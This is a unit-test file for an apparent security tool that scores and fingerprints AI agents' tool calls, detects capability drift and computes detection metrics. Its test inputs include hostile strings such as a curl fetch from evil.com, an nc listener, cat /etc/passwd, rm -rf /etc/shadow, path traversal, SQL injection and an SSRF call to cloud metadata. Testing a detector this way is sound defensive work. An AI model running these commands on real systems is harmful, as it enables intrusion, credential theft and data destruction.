import asyncio
import json
import os
import pytest
import pytest_asyncio
from typing import AsyncGenerator
from uuid import uuid4

from blackwall.analytics import AgentBehavioralAnalytics, Agent_Behavioral_Analytics
from blackwall.db.repository import SQLiteThreatRepository
from blackwall.eval.metrics import calculateMetrics
from blackwall.models import (
    BehaviorScore,
    CBMResponse,
    EventType,
    GTIResponse,
    GroundTruthLabel,
    SecurityEvent,
    SinkType,
    TestResult,
    ToolCallContext,
    Verdict,
    VerdictDecision,
)

TEST_DB_PATH = "test_unit_analytics_coverage.db"


@pytest_asyncio.fixture
async def repo() -> AsyncGenerator[SQLiteThreatRepository, None]:
    if os.path.exists(TEST_DB_PATH):
        os.remove(TEST_DB_PATH)

    repository = SQLiteThreatRepository(db_path=TEST_DB_PATH)
    await repository.initialize()
    yield repository

    await repository.close()
    if os.path.exists(TEST_DB_PATH):
        os.remove(TEST_DB_PATH)


class MockInteraction:
    def __init__(self, output_text: str):
        self.output_text = output_text
        self.id = "mock_interaction_123"


class MockInteractions:
    def __init__(self, create_fn):
        self.create = create_fn


class MockGeminiClient:
    def __init__(self, response_text: str, sleep_time: float = 0.0, raise_exc: bool = False):
        self.response_text = response_text
        self.sleep_time = sleep_time
        self.raise_exc = raise_exc
        self.calls = []
        self.interactions = MockInteractions(self.create)

    async def create(self, model: str, input: str, **kwargs) -> MockInteraction:
        self.calls.append((model, input, kwargs))
        if self.sleep_time > 0:
            await asyncio.sleep(self.sleep_time)
        if self.raise_exc:
            raise RuntimeError("Simulated Gemini API error")
        return MockInteraction(self.response_text)


class SyncMockGeminiClient:
    def __init__(self, response_text: str):
        self.response_text = response_text
        self.calls = []
        self.interactions = MockInteractions(self.create)

    def create(self, model: str, input: str, **kwargs) -> MockInteraction:
        self.calls.append((model, input, kwargs))
        return MockInteraction(self.response_text)


# =========================================================================
# Task 7.1: Behavioral Analytics & Evaluation Metrics Coverage Tests
# =========================================================================

def test_analytics_init_invalid_batch_size():
    with pytest.raises(ValueError, match="batch_size must be a positive integer"):
        AgentBehavioralAnalytics(batch_size=0)
    with pytest.raises(ValueError, match="batch_size must be a positive integer"):
        AgentBehavioralAnalytics(batch_size=-10)


def test_analytics_embedding_generation_fallback():
    analytics = AgentBehavioralAnalytics()
    vec1 = analytics._get_embedding("curl http://evil.com/sh")
    vec2 = analytics._get_embedding("curl http://evil.com/sh")
    vec3 = analytics._get_embedding("different payload")

    assert len(vec1) == 768
    assert all(-1.0 <= v <= 1.0 for v in vec1)
    assert vec1 == vec2
    assert vec1 != vec3


def test_generalize_string_comprehensive():
    analytics = AgentBehavioralAnalytics()

    # API Keys / Tokens
    assert analytics._generalize_string("api_key: abcdef1234567890abcdef") == "api_key:[[API_KEY]]"
    assert analytics._generalize_string("token: ghp_12345678901234567890") == "token:[[API_KEY]]"
    assert analytics._generalize_string("apikey: sk-proj-12345678901234567890") == "apikey:[[API_KEY]]"

    # IP Addresses
    assert analytics._generalize_string("ping 192.168.1.100 now") == "ping [[IP_ADDRESS]] now"
    assert analytics._generalize_string("connect 10.0.0.1 and 172.16.0.1") == "connect [[IP_ADDRESS]] and [[IP_ADDRESS]]"

    # Script names
    assert analytics._generalize_string("bash script.sh") == "bash [[SCRIPT_NAME]]"
    assert analytics._generalize_string("python exploit.py") == "python [[SCRIPT_NAME]]"
    assert analytics._generalize_string("perl payload.pl") == "perl [[SCRIPT_NAME]]"
    assert analytics._generalize_string("ruby attack.rb") == "ruby [[SCRIPT_NAME]]"
    assert analytics._generalize_string("sh launcher.bash") == "sh [[SCRIPT_NAME]]"

    # URLs (and idempotent placeholder preservation)
    assert analytics._generalize_string("curl https://evil.com/payload.bin") == "curl [[URL]]"
    assert analytics._generalize_string("curl http://[[IP_ADDRESS]][[FILE_PATH]]") == "curl http://[[IP_ADDRESS]][[FILE_PATH]]"

    # Passwords
    assert analytics._generalize_string("password = SuperSecretPass123") == "password:[[PASSWORD]]"
    assert analytics._generalize_string("pwd: my_secret_pwd") == "pwd:[[PASSWORD]]"
    assert analytics._generalize_string("passwd: root123") == "passwd:[[PASSWORD]]"

    # Emails
    assert analytics._generalize_string("send mail to attacker@evil.org now") == "send mail to [[EMAIL]] now"

    # File paths
    assert analytics._generalize_string("cat /var/log/secure") == "cat [[FILE_PATH]]"
    assert analytics._generalize_string("rm -rf /etc/shadow") == "rm -rf [[FILE_PATH]]"


def test_generalize_dict_value_and_payload():
    analytics = AgentBehavioralAnalytics()

    data = {
        "api_key": "verylongsecretkey1234567890",
        "password": "mypassword123",
        "nested": {
            "token": "tok_12345678901234567890",
            "url": "https://attacker.site/steal",
            "count": 42,
            "active": True,
        },
        "scripts": ["run.sh", "malicious.py", 100],
    }

    generalized = analytics._generalize_dict_value(data)
    assert generalized["api_key"] == "[[API_KEY]]"
    assert generalized["password"] == "[[PASSWORD]]"
    assert generalized["nested"]["token"] == "[[API_KEY]]"
    assert generalized["nested"]["url"] == "[[URL]]"
    assert generalized["nested"]["count"] == 42
    assert generalized["nested"]["active"] is True
    assert generalized["scripts"] == ["[[SCRIPT_NAME]]", "[[SCRIPT_NAME]]", 100]

    payload_str = analytics._generalize_payload(data)
    parsed = json.loads(payload_str)
    assert parsed["api_key"] == "[[API_KEY]]"


@pytest.mark.asyncio
async def test_score_event_markdown_code_block():
    mock_resp = "```json\n{\"score\": 3.5, \"risk_level\": \"HIGH\"}\n```"
    client = MockGeminiClient(mock_resp)
    analytics = AgentBehavioralAnalytics(client=client)

    event = SecurityEvent(
        event_type=EventType.BLOCK,
        tool_context=ToolCallContext(tool_name="cmd", arguments={"cmd": "ls"}),
        verdict=Verdict(decision=VerdictDecision.BLOCK, reasoning="Suspicious", confidence_score=0.8),
    )

    score = await analytics.scoreEvent(event)
    assert score.score == 3.5 / 5.0
    assert score.risk_level == "HIGH"


@pytest.mark.asyncio
async def test_score_event_sync_client():
    mock_resp = "{\"score\": 2.0, \"risk_level\": \"MEDIUM\"}"
    client = SyncMockGeminiClient(mock_resp)
    analytics = AgentBehavioralAnalytics(client=client)

    event = SecurityEvent(
        event_type=EventType.ALLOW,
        tool_context=ToolCallContext(tool_name="cmd", arguments={}),
        verdict=Verdict(decision=VerdictDecision.ALLOW, reasoning="Benign", confidence_score=0.9),
    )

    score = await analytics.scoreEvent(event)
    assert score.score == 2.0 / 5.0
    assert score.risk_level == "MEDIUM"


@pytest.mark.asyncio
async def test_score_event_fallback_branches():
    analytics = AgentBehavioralAnalytics()

    event_block = SecurityEvent(
        event_type=EventType.BLOCK,
        tool_context=ToolCallContext(tool_name="test", arguments={}),
        verdict=Verdict(decision=VerdictDecision.BLOCK, reasoning="Blocked", confidence_score=0.9),
    )
    score_block = await analytics.scoreEvent(event_block)
    assert score_block.score == 4.5 / 5.0
    assert score_block.risk_level == "CRITICAL"

    event_quarantine = SecurityEvent(
        event_type=EventType.QUARANTINE,
        tool_context=ToolCallContext(tool_name="test", arguments={}),
        verdict=Verdict(decision=VerdictDecision.QUARANTINE, reasoning="Quarantined", confidence_score=0.8),
    )
    score_quarantine = await analytics.scoreEvent(event_quarantine)
    assert score_quarantine.score == 3.0 / 5.0
    assert score_quarantine.risk_level == "HIGH"

    event_allow = SecurityEvent(
        event_type=EventType.ALLOW,
        tool_context=ToolCallContext(tool_name="test", arguments={}),
        verdict=Verdict(decision=VerdictDecision.ALLOW, reasoning="Allowed", confidence_score=0.95),
    )
    score_allow = await analytics.scoreEvent(event_allow)
    assert score_allow.score == 1.0 / 5.0
    assert score_allow.risk_level == "MEDIUM"


def test_detect_drift_custom_baseline():
    analytics = AgentBehavioralAnalytics(baseline_score=1.0)

    # With default baseline (1.0): tolerance band is [0.5, 1.5] on 0-5 scale
    # Current score normalized 0.2 -> 1.0 (no drift)
    assert not analytics.detectDrift(0.2)
    # Current score normalized 0.5 -> 2.5 (drift = 1.5 > 0.5)
    assert analytics.detectDrift(0.5)

    # With custom baseline (3.0): tolerance band is [2.5, 3.5] on 0-5 scale
    # Current score normalized 0.6 -> 3.0 (no drift)
    assert not analytics.detectDrift(0.6, baseline_score=3.0)
    # Current score normalized 0.2 -> 1.0 (drift = 2.0 > 0.5)
    assert analytics.detectDrift(0.2, baseline_score=3.0)


@pytest.mark.asyncio
async def test_generate_signature_mitigation_actions(repo: SQLiteThreatRepository):
    analytics = AgentBehavioralAnalytics(repo=repo)

    # 1. Critical Sink -> BLOCK_AND_QUARANTINE_CODE_PATH
    event_critical = SecurityEvent(
        event_type=EventType.BLOCK,
        tool_context=ToolCallContext(tool_name="run_command", arguments={"command": "nc -lvnp 4444"}),
        verdict=Verdict(decision=VerdictDecision.BLOCK, reasoning="Critical command", confidence_score=0.9),
        cbm_response=CBMResponse(blast_radius=3, critical_sinks=[SinkType.PROCESS]),
    )
    sig1 = await analytics.generateSignature(event_critical)
    assert sig1.sink_type == SinkType.PROCESS

    # 2. GTI Malicious -> BLOCK_AND_ALERT_SECURITY_TEAM
    event_gti = SecurityEvent(
        event_type=EventType.BLOCK,
        tool_context=ToolCallContext(tool_name="network_call", arguments={"url": "https://c2.evil.com"}),
        verdict=Verdict(decision=VerdictDecision.BLOCK, reasoning="C2 network call", confidence_score=0.95),
        gti_response=GTIResponse(indicator="c2.evil.com", is_malicious=True, detection_rate=95.0),
    )
    sig2 = await analytics.generateSignature(event_gti)
    assert sig2.pattern == '{"url": "[[URL]]"}'

    # 3. Neither -> BLOCK_AND_LOG
    event_log = SecurityEvent(
        event_type=EventType.BLOCK,
        tool_context=ToolCallContext(tool_name="custom_tool", arguments={"param": "value"}),
        verdict=Verdict(decision=VerdictDecision.BLOCK, reasoning="Standard blocked tool", confidence_score=0.8),
    )
    sig3 = await analytics.generateSignature(event_log)
    assert sig3.sink_type == SinkType.PROCESS


@pytest.mark.asyncio
async def test_trigger_refactoring_sink_types():
    analytics = AgentBehavioralAnalytics()

    # Database -> SQL Injection
    event_db = SecurityEvent(
        event_type=EventType.QUARANTINE,
        tool_context=ToolCallContext(tool_name="sql_exec", arguments={"CommandLine": "SELECT * FROM users WHERE id=" + "1 OR 1=1"}),
        verdict=Verdict(decision=VerdictDecision.QUARANTINE, reasoning="SQL injection attempt", confidence_score=0.9),
        cbm_response=CBMResponse(blast_radius=1, critical_sinks=[SinkType.DATABASE]),
    )
    hint_db = await analytics.triggerRefactoring(event_db)
    assert hint_db.vulnerability_type == "SQL Injection"
    assert "parameterized queries" in hint_db.suggested_fix
    assert hint_db.confidence == 0.9

    # File System -> Path Traversal
    event_fs = SecurityEvent(
        event_type=EventType.QUARANTINE,
        tool_context=ToolCallContext(tool_name="read_file", arguments={"path": "/var/log/../../etc/passwd"}),
        verdict=Verdict(decision=VerdictDecision.QUARANTINE, reasoning="Path traversal attempt", confidence_score=0.85),
        cbm_response=CBMResponse(blast_radius=1, critical_sinks=[SinkType.FILE_SYSTEM]),
    )
    hint_fs = await analytics.triggerRefactoring(event_fs)
    assert hint_fs.vulnerability_type == "Path Traversal"
    assert hint_fs.confidence == 0.85

    # Network -> SSRF
    event_net = SecurityEvent(
        event_type=EventType.QUARANTINE,
        tool_context=ToolCallContext(tool_name="fetch_url", arguments={"url": "http://169.254.169.254/latest/meta-data/"}),
        verdict=Verdict(decision=VerdictDecision.QUARANTINE, reasoning="SSRF to cloud metadata", confidence_score=0.8),
        cbm_response=CBMResponse(blast_radius=1, critical_sinks=[SinkType.NETWORK]),
    )
    hint_net = await analytics.triggerRefactoring(event_net)
    assert hint_net.vulnerability_type == "Server-Side Request Forgery (SSRF)"
    assert hint_net.confidence == 0.8


@pytest.mark.asyncio
async def test_trigger_refactoring_with_repo_and_llm(repo: SQLiteThreatRepository):
    mock_resp = json.dumps({
        "suggestion": "Sanitize shell inputs",
        "confidence": 0.99,
        "vulnerability_type": "Command Injection",
        "suggested_fix": "Use shlex.quote or subprocess with execve",
    })
    client = MockGeminiClient(mock_resp)
    analytics = AgentBehavioralAnalytics(repo=repo, client=client, batch_size=2)

    # First write a signature to the repo
    event_cmd = SecurityEvent(
        event_type=EventType.BLOCK,
        tool_context=ToolCallContext(tool_name="run_command", arguments={"cmd": "cat /etc/passwd"}),
        verdict=Verdict(decision=VerdictDecision.BLOCK, reasoning="Forbidden", confidence_score=0.9),
    )
    sig = await analytics.generateSignature(event_cmd)

    # Now trigger refactoring with related signature
    event_quarantine = SecurityEvent(
        event_type=EventType.QUARANTINE,
        tool_context=ToolCallContext(tool_name="run_command", arguments={"cmd": "cat /etc/passwd"}),
        verdict=Verdict(decision=VerdictDecision.QUARANTINE, reasoning="Quarantined", confidence_score=0.85),
        related_signatures=[sig.signature_id],
    )
    hint = await analytics.triggerRefactoring(event_quarantine)
    assert hint.confidence == 0.99
    assert hint.vulnerability_type == "Command Injection"

    # Verify signature metadata updated in SQLite repo
    async with repo.pool.connection() as conn:
        cursor = await conn.execute(
            "SELECT metadata FROM signatures WHERE signature_id = ?",
            (str(sig.signature_id),),
        )
        row = await cursor.fetchone()
        assert row is not None
        meta = json.loads(row[0])
        assert "refactoring_hint" in meta
        assert meta["refactoring_hint"]["vulnerability_type"] == "Command Injection"


def test_agbom_update_and_export(caplog):
    analytics = AgentBehavioralAnalytics(allowed_tools={"query_db", "fetch_records"})

    event1 = SecurityEvent(
        event_type=EventType.ALLOW,
        tool_context=ToolCallContext(tool_name="query_db", arguments={"table": "users", "limit": 10}),
        verdict=Verdict(decision=VerdictDecision.ALLOW, reasoning="Safe read", confidence_score=0.95),
    )
    analytics.updateAgBOM(event1)
    analytics.updateAgBOM(event1)

    assert analytics.agbom["tools"]["query_db"]["frequency"] == 2
    assert analytics.agbom["tools"]["query_db"]["argument_patterns"] == [["limit", "table"]]

    # Capability drift detection
    event_drift = SecurityEvent(
        event_type=EventType.ALLOW,
        tool_context=ToolCallContext(tool_name="unexpected_shell_tool", arguments={"cmd": "whoami"}),
        verdict=Verdict(decision=VerdictDecision.ALLOW, reasoning="Allowed but unlisted", confidence_score=0.5),
        agent_id="test_agent_1",
    )
    with caplog.at_level("INFO"):
        analytics.updateAgBOM(event_drift)

    assert "unexpected_shell_tool" in analytics.agbom["tools"]
    # Verify anomaly log message contains the payload directly
    assert any("ANOMALY_EVENT_LOGGED:" in record.message and "unexpected_shell_tool" in record.message for record in caplog.records)
    exported = analytics.exportAgBOM()
    data = json.loads(exported)
    assert "query_db" in data["tools"]
    assert "unexpected_shell_tool" in data["tools"]


@pytest.mark.asyncio
async def test_agent_behavioral_analytics_static_stub():
    candidate = {"tool": "bash", "pattern": "rm -rf"}
    res = await Agent_Behavioral_Analytics.generateSignature(candidate)
    assert res == candidate


# =========================================================================
# Evaluation Metrics Unit Tests (calculateMetrics)
# =========================================================================

def test_calculate_metrics_all_benign_and_all_malicious():
    # All benign, all allowed
    res_benign = [TestResult(verdict_decision=VerdictDecision.ALLOW) for _ in range(5)]
    truth_benign = [GroundTruthLabel.BENIGN for _ in range(5)]
    metrics_benign = calculateMetrics(res_benign, truth_benign)
    assert metrics_benign.accuracy == 100.0
    assert metrics_benign.false_refusal_rate == 0.0
    assert metrics_benign.evasion_rate == 0.0

    # All malicious, all blocked
    res_malicious = [TestResult(verdict_decision=VerdictDecision.BLOCK) for _ in range(5)]
    truth_malicious = [GroundTruthLabel.MALICIOUS for _ in range(5)]
    metrics_malicious = calculateMetrics(res_malicious, truth_malicious)
    assert metrics_malicious.accuracy == 100.0
    assert metrics_malicious.recall == 100.0
    assert metrics_malicious.f1_score == 100.0
    assert metrics_malicious.evasion_rate == 0.0

    # Mixed with quarantine count verification
    res_mixed = [
        TestResult(verdict_decision=VerdictDecision.QUARANTINE),
        TestResult(verdict_decision=VerdictDecision.ALLOW),
    ]
    truth_mixed = [GroundTruthLabel.MALICIOUS, GroundTruthLabel.BENIGN]
    metrics_mixed = calculateMetrics(res_mixed, truth_mixed)
    assert metrics_mixed.quarantine_count == 1
    assert metrics_mixed.accuracy == 100.0
